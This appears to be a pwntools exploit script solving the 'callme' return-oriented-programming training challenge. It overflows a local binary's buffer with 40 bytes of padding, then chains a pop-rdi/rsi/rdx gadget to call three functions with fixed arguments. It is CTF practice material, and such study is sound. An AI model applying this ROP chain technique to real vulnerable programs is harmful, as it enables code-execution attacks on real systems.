#!/usr/bin/env python3

from pwn import *

exe = './callme'
elf = context.binary = ELF(exe,checksec=False)
context.log_level='debug'

io = process(exe)

padding = 40

pop3 = 0x000000000040093c # pop rdi; pop rsi; pop rdx; ret; 

param1 = 0xdeadbeefdeadbeef
param2 = 0xcafebabecafebabe
param3 = 0xd00df00dd00df00d

payload = flat(
    asm('nop')*padding,
    pop3,
    param1,
    param2,
    param3,
    elf.symbols.callme_one,
    pop3,
    param1,
    param2,
    param3,
    elf.symbols.callme_two,
    pop3,
    param1,
    param2,
    param3,
    elf.symbols.callme_three,
)

io.sendlineafter(b'>',payload)
io.interactive()
